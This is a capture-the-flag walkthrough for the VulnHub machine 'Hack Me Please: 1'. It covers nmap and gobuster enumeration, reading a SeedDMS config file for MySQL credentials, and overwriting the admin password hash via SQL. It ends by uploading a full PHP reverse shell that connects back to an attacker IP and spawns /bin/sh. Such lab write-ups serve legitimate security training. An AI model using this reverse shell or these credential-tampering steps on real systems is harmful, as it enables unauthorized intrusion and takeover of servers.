# Hack Me Please: 1

- **Machine:** Hack Me Please: 1
- **Download:** https://www.vulnhub.com/entry/hack-me-please-1,731/

![](812-1.png)

---

## Setup

- Extract the downloaded `.rar` file.
- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](812-2.png)

---

## Full Port Scan

Run a complete Nmap scan to identify open ports, services, OS information, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.181
```

![](812-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.244
```

```bash
nmap -sC -sV -A 192.168.2.244
```

---

## HTTP Enumeration

Perform an aggressive scan using the `http-enum` NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.244
```

![](812-4.png)

---

# Web Enumeration

Visit the target application.

- http://192.168.2.244

---

## Inspect the Source Code

View the page source.

![](812-5.png)

Open the JavaScript file.

- http://192.168.2.244/js/main.js

![](812-6.png)

A hidden SeedDMS application is discovered.

Visit:

- http://192.168.2.244/seeddms51x/seeddms-5.1.22

![](812-7.png)

---

## Directory Enumeration

Enumerate directories.

```bash
gobuster dir -u http://192.168.2.244/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php -t 50
```

![](812-8.png)

Enumerate the configuration directory.

```bash
gobuster dir -u http://192.168.2.244/seeddms51x/conf -w /usr/share/wordlists/dirb/common.txt -x xml,txt,bak,conf
```

![](812-9.png)

Visit the discovered configuration file.

- http://192.168.2.244/seeddms51x/conf/settings.xml

![](812-10.png)

---

# MySQL Enumeration

Connect to the exposed MySQL service.

```bash
mysql --skip-ssl -h 192.168.2.244 -u seeddms -pseeddms
```

![](812-11.png)

Display the available databases.

```sql
SHOW DATABASES;
```

Select the SeedDMS database.

```sql
USE seeddms;
```

List all tables.

```sql
SHOW TABLES;
```

![](812-12.png)

Enumerate user information.

```sql
SELECT * FROM users;
```

```sql
SELECT * FROM tblUsers;
```

![](812-13.png)

---

## Login Attempt

Try logging into the SeedDMS portal using the recovered credentials.

- http://192.168.2.244/seeddms51x/seeddms-5.1.22/out/out.Login.php

![](812-14.png)

The login fails because the stored password is hashed.

---

## Password Reset via Database

Identify the password hash type.

```bash
hash-identifier "f9ef2c539bad8a6d2f3432b6d49ab51a"
```

![](812-15.png)

Generate an MD5 hash for a known password.

```bash
echo -n "hackme123" | md5sum
```

```bash
echo -n "hackme123" | md5sum | cut -d ' ' -f1
```

![](812-16.png)

Replace the administrator password hash.

```sql
UPDATE tblUsers SET pwd='4d55ef6655de2b4a006ada41db320e6f' WHERE login='admin';
```

![](812-17.png)

Login using the updated credentials.

- http://192.168.2.244/seeddms51x/seeddms-5.1.22/out/out.Login.php

```text
Username : admin
Password : hackme123
```

![](812-18.png)

Successful login.

![](812-19.png)

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

Search for available SeedDMS exploits.

```bash
searchsploit seeddms
```

![](812-20.png)

Review the related Exploit-DB entry.

- https://www.exploit-db.com/exploits/47022

![](812-21.png)

Create a PHP reverse shell.

```bash
nano reverse_shell.php
```

Paste the reverse shell code.

```php
<?php

set_time_limit(0);
$VERSION = "1.0";
$ip = '192.168.2.219';   // CHANGE THIS
$port = 443;             // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) exit(1);
    if ($pid) exit(0);

    if (posix_setsid() == -1) exit(1);

    $daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);

if (!$sock) exit(1);

$descriptorspec = [
    0 => ["pipe","r"],
    1 => ["pipe","w"],
    2 => ["pipe","w"]
];

$process = proc_open($shell,$descriptorspec,$pipes);

stream_set_blocking($pipes[0],0);
stream_set_blocking($pipes[1],0);
stream_set_blocking($pipes[2],0);
stream_set_blocking($sock,0);

while (1) {

    if (feof($sock) || feof($pipes[1])) break;

    $read_a = [$sock,$pipes[1],$pipes[2]];
    stream_select($read_a,$write_a,$error_a,null);

    if (in_array($sock,$read_a))
        fwrite($pipes[0], fread($sock,$chunk_size));

    if (in_array($pipes[1],$read_a))
        fwrite($sock, fread($pipes[1],$chunk_size));

    if (in_array($pipes[2],$read_a))
        fwrite($sock, fread($pipes[2],$chunk_size));
}

fclose($sock);
proc_close($process);

?>
```

Upload the PHP reverse shell.

![](812-22.png)

Upload completed successfully.

![](812-23.png)

Start a Netcat listener.

```bash
nc -nlvp 443
```

Trigger the uploaded file.

```text
http://192.168.2.244/seeddms51x/data/1048576/4/1.php
```

A reverse shell is established.

![](812-24.png)

---

# Key Learning

- JavaScript files often reveal hidden application paths.
- Configuration files may expose sensitive database credentials.
- Exposed database access can lead to full application compromise.
- Password hashes can sometimes be replaced when database write access is available.
- Authenticated file upload vulnerabilities can lead to Remote Code Execution.
- SeedDMS has publicly known vulnerabilities that should always be checked during enumeration.

---

# Summary

The assessment began by discovering a hidden SeedDMS installation through JavaScript enumeration. An exposed configuration file revealed MySQL credentials, allowing direct database access. The administrator password hash was replaced with a known MD5 hash, resulting in successful authentication to the SeedDMS portal. Finally, a PHP reverse shell was uploaded through the application, leading to remote code execution and initial access to the target system.